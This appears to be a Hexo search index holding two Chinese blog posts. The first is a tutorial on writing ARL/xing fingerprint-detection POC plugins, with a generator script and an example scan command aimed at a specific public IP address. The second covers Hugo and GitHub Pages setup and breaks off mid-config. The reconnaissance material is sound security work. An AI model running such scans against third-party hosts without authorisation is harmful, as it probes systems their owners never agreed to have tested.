<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>arl_poc编写</title>
      <link href="/2021/07/01/arl_poc%E7%BC%96%E5%86%99/"/>
      <url>/2021/07/01/arl_poc%E7%BC%96%E5%86%99/</url>
      
        <content type="html"><![CDATA[<p>最新版的arl增加了poc编写与探测的功能。打算自己编写一些常用poc来提高杀伤力。</p><p>因为主要用来做资产发现，本人更注重于指纹识别以及一些简单的poc探测。主要关注一下几个方面</p><h3 id="指纹识别："><a href="#指纹识别：" class="headerlink" title="指纹识别："></a>指纹识别：</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">shiro</span><br><span class="line">struts2</span><br><span class="line">weblogic</span><br><span class="line">spring</span><br><span class="line">solr</span><br></pre></td></tr></table></figure><h3 id="简单的poc探测："><a href="#简单的poc探测：" class="headerlink" title="简单的poc探测："></a>简单的poc探测：</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">springboot未授权</span><br><span class="line">swagger接口文档发现</span><br><span class="line">...</span><br></pre></td></tr></table></figure><h3 id="敏感资产发现："><a href="#敏感资产发现：" class="headerlink" title="敏感资产发现："></a>敏感资产发现：</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">系统后台</span><br><span class="line">管理系统</span><br><span class="line">...</span><br></pre></td></tr></table></figure><h2 id="1-arl-poc框架"><a href="#1-arl-poc框架" class="headerlink" title="1. arl poc框架"></a>1. arl poc框架</h2><p>arl poc工具存在于v2.3.1镜像中。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull tophant/arl:v2.3.1</span><br></pre></td></tr></table></figure><p>进入镜像：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">docker exec -it arl_web /bin/bash</span><br><span class="line"></span><br><span class="line">find / -name poc</span><br><span class="line"></span><br><span class="line">cd /opt/ARL-NPoC/xing/ # 进入poc框架目录，可直接将ARL-NPoC打包拷贝出来进行本地使用</span><br></pre></td></tr></table></figure><p>Arl-npoc本地使用：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">xing -h</span><br><span class="line">usage: xing [-h] [--version] [--quit]</span><br><span class="line">            [--log &#123;debug,info,success,warning,error&#125;]</span><br><span class="line">            &#123;list,scan,sniffer,exploit,brute&#125; ...</span><br><span class="line"></span><br><span class="line">positional arguments:</span><br><span class="line">  &#123;list,scan,sniffer,exploit,brute&#125;</span><br><span class="line">                        子命令</span><br><span class="line">    list                显示插件</span><br><span class="line">    scan                扫描</span><br><span class="line">    sniffer             协议识别</span><br><span class="line">    exploit             漏洞利用</span><br><span class="line">    brute               弱口令爆破</span><br><span class="line"></span><br><span class="line">optional arguments:</span><br><span class="line">  -h, --help            show this help message and exit</span><br><span class="line">  --version, -V         show program&#x27;s version number and exit</span><br><span class="line">  --quit, -q            安静模式 (default: False)</span><br><span class="line">  --log &#123;debug,info,success,warning,error&#125;, -L &#123;debug,info,success,warning,error&#125;</span><br><span class="line">                        日志等级 (default: info)</span><br></pre></td></tr></table></figure><p>针对单个目标探测；</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xing scan -t http://218.75.7.27:8089/</span><br></pre></td></tr></table></figure><h2 id="2-如何编写"><a href="#2-如何编写" class="headerlink" title="2.如何编写"></a>2.如何编写</h2><h3 id="2-1-各个函数的意义"><a href="#2-1-各个函数的意义" class="headerlink" title="2.1 各个函数的意义"></a>2.1 各个函数的意义</h3><h3 id="init-初始化函数。"><a href="#init-初始化函数。" class="headerlink" title="__init()__:初始化函数。"></a><code>__init()__</code>:初始化函数。</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">    <span class="built_in">super</span>(Plugin, self).__init__()</span><br><span class="line">    <span class="comment"># 插件类型poc</span></span><br><span class="line">    self.plugin_type = PluginType.POC</span><br><span class="line">    <span class="comment"># 插件name</span></span><br><span class="line">    self.vul_name = <span class="string">&quot;泛微 Ecology getdata.jsp SQL注入漏洞&quot;</span></span><br><span class="line">    <span class="comment"># 探测组件name</span></span><br><span class="line">    self.app_name = <span class="string">&#x27;Ecology&#x27;</span></span><br><span class="line">    <span class="comment"># 探测协议？</span></span><br><span class="line">    self.scheme = [SchemeType.HTTP, SchemeType.HTTPS]</span><br></pre></td></tr></table></figure><h3 id="verify-验证函数。"><a href="#verify-验证函数。" class="headerlink" title="verify():验证函数。"></a><code>verify()</code>:验证函数。</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">verify</span>(<span class="params">self, target</span>):</span>   <span class="comment">#参数target</span></span><br><span class="line"></span><br><span class="line"><span class="comment">### `http_req()`:请求函数。</span></span><br><span class="line"></span><br><span class="line">​```python</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">http_req</span>(<span class="params">url, method = <span class="string">&#x27;get&#x27;</span>, **kwargs</span>):</span> <span class="comment">#传入url,请求方法get,post....</span></span><br></pre></td></tr></table></figure><p>post请求实例：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http_req(url, <span class="string">&#x27;post&#x27;</span>, data=data)</span><br></pre></td></tr></table></figure><h3 id="http-req-处理方法。"><a href="#http-req-处理方法。" class="headerlink" title="http_req()处理方法。"></a>http_req()处理方法。</h3><h4 id="1-content-获取响应包"><a href="#1-content-获取响应包" class="headerlink" title="1. content():    # 获取响应包"></a>1. content():    # 获取响应包</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">conn = http_req(url, <span class="string">&quot;get&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="string">b&quot;GitLab&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> conn.content:</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure><h4 id="2-json-json处理响应包"><a href="#2-json-json处理响应包" class="headerlink" title="2. json():       # json处理响应包"></a>2. json():       # json处理响应包</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">conn = http_req(url, <span class="string">&quot;get&quot;</span>)</span><br><span class="line">data = conn.json()</span><br></pre></td></tr></table></figure><h4 id="3-status-code：-获取响应值"><a href="#3-status-code：-获取响应值" class="headerlink" title="3. status_code：  #获取响应值"></a>3. status_code：  #获取响应值</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">conn = http_req(url, <span class="string">&quot;get&quot;</span>, auth=(user, passwd))</span><br><span class="line"><span class="keyword">if</span> conn.status_code == <span class="number">200</span>:</span><br><span class="line">     <span class="keyword">return</span> <span class="literal">True</span></span><br></pre></td></tr></table></figure><h4 id="4-text-获取响应体。和content类似吧"><a href="#4-text-获取响应体。和content类似吧" class="headerlink" title="4. text:            #获取响应体。和content类似吧"></a>4. text:            #获取响应体。和content类似吧</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">conn = http_req(url, <span class="string">&quot;get&quot;</span>)</span><br><span class="line">pattern = <span class="string">r&#x27;&lt;meta\s+name=&quot;csrf-token&quot;\s+content=&quot;([^\&quot;]+)+&quot;\s+/&gt;&#x27;</span></span><br><span class="line">matches = re.findall(pattern=pattern, string=conn.text)</span><br></pre></td></tr></table></figure><h4 id="5-headers-get-获取响应头"><a href="#5-headers-get-获取响应头" class="headerlink" title="5. headers.get()     # 获取响应头"></a>5. headers.get()     # 获取响应头</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">conn = http_req(url, <span class="string">&quot;get&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> self._check_str <span class="keyword">not</span> <span class="keyword">in</span> conn.headers.get(<span class="string">&quot;WWW-Authenticate&quot;</span>, <span class="string">&quot;&quot;</span>):</span><br><span class="line">       <span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure><h4 id="6-self-logger-debug-信息回显"><a href="#6-self-logger-debug-信息回显" class="headerlink" title="6.self.logger.debug()         #信息回显"></a>6.self.logger.debug()         #信息回显</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">self.logger.debug(<span class="string">&quot;not Ecology &#123;&#125;&quot;</span>.<span class="built_in">format</span>(target))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">init_logger</span>():</span></span><br><span class="line">    log_colors = &#123;</span><br><span class="line">        <span class="string">&#x27;DEBUG&#x27;</span>: <span class="string">&#x27;white&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;INFO&#x27;</span>: <span class="string">&#x27;green&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;SUCCESS&#x27;</span>:  <span class="string">&#x27;red&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;WARNING&#x27;</span>: <span class="string">&#x27;yellow&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;ERROR&#x27;</span>: <span class="string">&#x27;red&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;CRITICAL&#x27;</span>: <span class="string">&#x27;bold_red&#x27;</span>,</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2 id="3-如何优雅的编写"><a href="#3-如何优雅的编写" class="headerlink" title="3.如何优雅的编写"></a>3.如何优雅的编写</h2><p>因为手里有很多的json指纹文件和poc，一个个手动转成arl的poc不太现实。编写脚本自动根据arl的poc格式生成poc脚本。</p><h3 id="指纹自动生成："><a href="#指纹自动生成：" class="headerlink" title="指纹自动生成："></a>指纹自动生成：</h3><p>python脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">finger_file = <span class="string">&#x27;aspx.json&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">str</span> = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">from xing.core.BasePlugin import BasePlugin</span></span><br><span class="line"><span class="string">from xing.utils import http_req, get_logger</span></span><br><span class="line"><span class="string">from xing.core import PluginType, SchemeType</span></span><br><span class="line"><span class="string">import requests</span></span><br><span class="line"><span class="string">import hashlib</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">class Plugin(BasePlugin):</span></span><br><span class="line"><span class="string">    def __init__(self):</span></span><br><span class="line"><span class="string">        super(Plugin, self).__init__()</span></span><br><span class="line"><span class="string">        self.plugin_type = PluginType.POC</span></span><br><span class="line"><span class="string">        self.vul_name = &quot;发现&#123;&#123;name&#125;&#125;&quot;</span></span><br><span class="line"><span class="string">        self.app_name = &#x27;&#123;&#123;name&#125;&#125;&#x27;</span></span><br><span class="line"><span class="string">        self.scheme = [SchemeType.HTTP, SchemeType.HTTPS]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    def verify(self, target):</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">html = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        url = target + &quot;&#123;&#123;uri&#125;&#125;&quot;</span></span><br><span class="line"><span class="string">        if b&#x27;&#123;&#123;html&#125;&#125;&#x27; in http_req(url).content:</span></span><br><span class="line"><span class="string">            self.logger.success(&quot;found &#123;&#123;name&#125;&#125; &#123;&#125;&quot;.format(url))</span></span><br><span class="line"><span class="string">            return url</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">md5 = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        url = target + &quot;&#123;&#123;uri&#125;&#125;&quot;</span></span><br><span class="line"><span class="string">        con = http_req(url).content</span></span><br><span class="line"><span class="string">        hl = hashlib.md5()</span></span><br><span class="line"><span class="string">        hl.update(con)</span></span><br><span class="line"><span class="string">        md5 = hl.hexdigest()</span></span><br><span class="line"><span class="string">        if md5 == &#x27;&#123;&#123;poc_md5&#125;&#125;&#x27;:</span></span><br><span class="line"><span class="string">            self.logger.success(&quot;found &#123;&#123;name&#125;&#125; &#123;&#125;&quot;.format(url))</span></span><br><span class="line"><span class="string">            return url</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write_file</span>(<span class="params">filename, str2</span>):</span></span><br><span class="line">    fo = <span class="built_in">open</span>(filename, <span class="string">&quot;a&quot;</span>)</span><br><span class="line">    fo.write(str2)</span><br><span class="line">    fo.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span>(<span class="params">name, rule, file_name</span>):</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;md5&#x27;</span> <span class="keyword">in</span> rule:</span><br><span class="line">        tmp_md5 = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        tmp_md5 = md5.replace(<span class="string">&quot;&#123;&#123;poc_md5&#125;&#125;&quot;</span>, rule[<span class="string">&#x27;md5&#x27;</span>])</span><br><span class="line">        tmp_md5 = tmp_md5.replace(<span class="string">&quot;&#123;&#123;uri&#125;&#125;&quot;</span>, rule[<span class="string">&#x27;uri&#x27;</span>])</span><br><span class="line">        tmp_md5 = tmp_md5.replace(<span class="string">&quot;&#123;&#123;name&#125;&#125;&quot;</span>, name)</span><br><span class="line">        write_file(file_name, tmp_md5)</span><br><span class="line">    <span class="keyword">elif</span> <span class="string">&#x27;html&#x27;</span> <span class="keyword">in</span> rule:</span><br><span class="line">        tmp_html = html.replace(<span class="string">&quot;&#123;&#123;html&#125;&#125;&quot;</span>, rule[<span class="string">&#x27;html&#x27;</span>])</span><br><span class="line">        tmp_html = tmp_html.replace(<span class="string">&quot;&#123;&#123;uri&#125;&#125;&quot;</span>, rule[<span class="string">&#x27;uri&#x27;</span>])</span><br><span class="line">        write_file(file_name, tmp_html)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">parser</span>(<span class="params">finger_file</span>):</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(finger_file) <span class="keyword">as</span> f:</span><br><span class="line">        fin_data = json.load(f)</span><br><span class="line">        <span class="comment"># print(fin_data)</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> fin_dict <span class="keyword">in</span> fin_data:</span><br><span class="line">        name = fin_dict</span><br><span class="line">        file_name = name.replace(<span class="string">&quot; &quot;</span>, <span class="string">&quot;_&quot;</span>) + <span class="string">&#x27;_Identify.py&#x27;</span></span><br><span class="line">        tmp_str = <span class="built_in">str</span>.replace(<span class="string">&quot;&#123;&#123;name&#125;&#125;&quot;</span>, name)</span><br><span class="line">        write_file(file_name, tmp_str)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(fin_data[fin_dict])):</span><br><span class="line">            rule = fin_data[fin_dict][i]</span><br><span class="line">            check(name, rule, file_name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">parser(finger_file)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>运行即可将指定的json指纹文件生成arl格式的指纹文件：</p><p><img src="3.1.png" alt="3.1"></p><h3 id="生成指纹测试："><a href="#生成指纹测试：" class="headerlink" title="生成指纹测试："></a>生成指纹测试：</h3><p>自动生成的指纹可能存在很多的问题，可在本地简单测试保证不爆红之后再同步到远程arl。</p><p>将ARL-NPoC拷贝到本地，按照readme提示安装：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pip3 install -e .      # 安装依赖</span><br><span class="line">python3 setup.py --help-commands  # 查看安装命令帮助</span><br><span class="line">python3 setup.py install       # 安装</span><br></pre></td></tr></table></figure><p>安装到本地之后可通过xing -h查看是否安装成功：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xing -h</span><br></pre></td></tr></table></figure><p><img src="3.2.png" alt="3.1"></p><p>提示帮助的同时也会加载编写好的插件，错误的插件会报错，此时就可以针对这些报错的插件做针对性修改。</p><h3 id="指纹同步到远程服务器："><a href="#指纹同步到远程服务器：" class="headerlink" title="指纹同步到远程服务器："></a>指纹同步到远程服务器：</h3><p>这里有一个很大的坑点，我将poc同步到arl_web这个容器中。在容器里运行测试poc是成功的</p><p><img src="3.3.png" alt="3.1"></p><p>但是我搭建在服务器上的arl测试却没有没有探测到。坑了我好久，最后去github 提issues。作者回答说要同步到arl_web和arl_work两个容器……</p><p><img src="3.4.png" alt="3.1"></p><p>最后同时拷贝到arl_web和are_work两个容器，指纹poc就能使用了。src/红队又多了一个好帮手。</p>]]></content>
      
      
      <categories>
          
          <category> 安全开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> arl poc </tag>
            
            <tag> arl </tag>
            
            <tag> poc编写 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hugo+github page搭建自定义域名的https博客</title>
      <link href="/2021/06/05/hugo+github%20page%E6%90%AD%E5%BB%BA%E8%87%AA%E5%AE%9A%E4%B9%89%E5%9F%9F%E5%90%8D%E7%9A%84https%E5%8D%9A%E5%AE%A2/"/>
      <url>/2021/06/05/hugo+github%20page%E6%90%AD%E5%BB%BA%E8%87%AA%E5%AE%9A%E4%B9%89%E5%9F%9F%E5%90%8D%E7%9A%84https%E5%8D%9A%E5%AE%A2/</url>
      
        <content type="html"><![CDATA[<h2 id="1-部署hugo"><a href="#1-部署hugo" class="headerlink" title="1.部署hugo"></a>1.部署hugo</h2><h3 id="mac安装Hugo："><a href="#mac安装Hugo：" class="headerlink" title="mac安装Hugo："></a>mac安装Hugo：</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">brew install hugo</span><br><span class="line">hugo version      查看hugo版本    </span><br></pre></td></tr></table></figure><h3 id="hugo创建博客"><a href="#hugo创建博客" class="headerlink" title="hugo创建博客:"></a>hugo创建博客:</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hugo new site h11ba1.com         #在当前目录下创建h11ba1.com文件夹</span><br></pre></td></tr></table></figure><h3 id="生成新的文章："><a href="#生成新的文章：" class="headerlink" title="生成新的文章："></a>生成新的文章：</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hugo new posts/first-post.md</span><br></pre></td></tr></table></figure><h3 id="文章内容如下："><a href="#文章内容如下：" class="headerlink" title="文章内容如下："></a>文章内容如下：</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">---</span><br><span class="line">title: &quot;My First Post&quot;</span><br><span class="line">date: 2021-07-01T13:46:58+08:00</span><br><span class="line"><span class="section">draft: flase</span></span><br><span class="line"><span class="section">---</span></span><br></pre></td></tr></table></figure><p>将草稿draft改为flase。</p><h3 id="配置博客主题："><a href="#配置博客主题：" class="headerlink" title="配置博客主题："></a>配置博客主题：</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git init</span><br><span class="line">git submodule add https://github.com/miiiku/hugo-theme-kagome.git ./themes/kagome  # 将此存储库作为Git - 子模块，这样将更容易获取这个主题的更新</span><br><span class="line">echo theme = \&quot;kagome\&quot; &gt;&gt; config.toml   # 更改配置文件，将主题加入配置</span><br></pre></td></tr></table></figure><h3 id="本地预览："><a href="#本地预览：" class="headerlink" title="本地预览："></a>本地预览：</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hugo server</span><br></pre></td></tr></table></figure><p><img src="1.1.png" alt="1.1"></p><h2 id="2-发布并托管到github"><a href="#2-发布并托管到github" class="headerlink" title="2.发布并托管到github"></a>2.发布并托管到github</h2><h3 id="创建一个github仓库："><a href="#创建一个github仓库：" class="headerlink" title="创建一个github仓库："></a>创建一个github仓库：</h3><p><img src="2.1.png" alt="2.1"></p><h3 id="发布代码到github："><a href="#发布代码到github：" class="headerlink" title="发布代码到github："></a>发布代码到github：</h3><p>修改配置：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">baseURL = &quot;https://h11ba1.com&quot;</span><br><span class="line">languageCode = &quot;en-us&quot;</span><br><span class="line">title = &quot;h11ba1&#x27;s blog&quot;</span><br><span class="line">theme = &quot;kagome&quot;</span><br><span class="line">publishDir = &quot;docs&quot;        # 修改静态代码文件夹为docs目录</span><br><span class="line">defaultContentLanguage = &quot;zh-cn&quot;</span><br><span class="line">uglyURLs=true</span><br></pre></td></tr></table></figure><p>更改github仓库配置：</p><p><img src="2.2.png" alt="2.2"></p><p>同步代码到GitHub：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">hugo  #编译md文档为静态文件。编译后的文件可以在docs文件夹下面找到</span><br><span class="line"></span><br><span class="line">git add .</span><br><span class="line">git commit -m &quot;first commit&quot;</span><br><span class="line">git remote add origin https://github.com/h1iba1/blog.git</span><br><span class="line">git push -u origin master</span><br></pre></td></tr></table></figure><h2 id="3-配置自定义https域名"><a href="#3-配置自定义https域名" class="headerlink" title="3.配置自定义https域名"></a>3.配置自定义https域名</h2><p>配置自定义的https子域名主要参考这篇文章：<a href="https://zhaouncle.com/hugo_03/">https://zhaouncle.com/hugo_03/</a></p><p>简单记录一下过程：</p><h3 id="创建CNAME文件："><a href="#创建CNAME文件：" class="headerlink" title="创建CNAME文件："></a>创建CNAME文件：</h3><p>在仓库根目录建立一个cname文件写入自定义的域名</p><p><img src="3.1.png" alt="3.1"></p><h3 id="注册cloudflare添加站点："><a href="#注册cloudflare添加站点：" class="headerlink" title="注册cloudflare添加站点："></a>注册cloudflare添加站点：</h3><p><img src="3.2.png" alt="3.1"></p><h3 id="选择免费功能："><a href="#选择免费功能：" class="headerlink" title="选择免费功能："></a>选择免费功能：</h3><p><img src="3.3.png" alt="3.1"></p><h3 id="添加dns解析记录："><a href="#添加dns解析记录：" class="headerlink" title="添加dns解析记录："></a>添加dns解析记录：</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">A h11ba1.com 185.199.108.153</span><br><span class="line">A h11ba1.com 185.199.109.153</span><br><span class="line">A h11ba1.com 185.199.110.153</span><br><span class="line">A h11ba1.com 185.199.111.153</span><br><span class="line">CNAME www h1iba1.github.io</span><br></pre></td></tr></table></figure><p><img src="3.4.png" alt="3.4"></p><p>更改ssl/tls设置：</p><p><img src="3.5.png" alt="3.5"></p><p>配置页面规则：<br><img src="3.6.png" alt="3.6"></p><h3 id="更改阿里云域名dns服务器："><a href="#更改阿里云域名dns服务器：" class="headerlink" title="更改阿里云域名dns服务器："></a>更改阿里云域名dns服务器：</h3><p><img src="3.7.png" alt="3.6"></p><h2 id="4-hugo的一些简单配置"><a href="#4-hugo的一些简单配置" class="headerlink" title="4.hugo的一些简单配置"></a>4.hugo的一些简单配置</h2><h3 id="config-toml文件："><a href="#config-toml文件：" class="headerlink" title="config.toml文件："></a>config.toml文件：</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">baseURL = &quot;https://h11ba1.com&quot;</span><br><span class="line">languageCode = &quot;en-us&quot;</span><br><span class="line">title = &quot;h11ba1&#x27;s blog&quot;</span><br><span class="line">theme = &quot;kagome&quot;</span><br><span class="line">publishDir = &quot;docs&quot;</span><br><span class="line">defaultContentLanguage = &quot;zh-cn&quot;</span><br><span class="line">uglyURLs=true</span><br><span class="line"></span><br><span class="line">[menu]</span><br><span class="line"><span class="meta">#</span><span class="bash"> 配置菜单栏</span></span><br><span class="line">    [[menu.main]]</span><br><span class="line">    identifier = &quot;blog&quot;</span><br><span class="line">    name       = &quot;Blogs&quot;</span><br><span class="line">    url        = &quot;/posts&quot;</span><br><span class="line">    [[menu.main]]</span><br><span class="line">    name       = 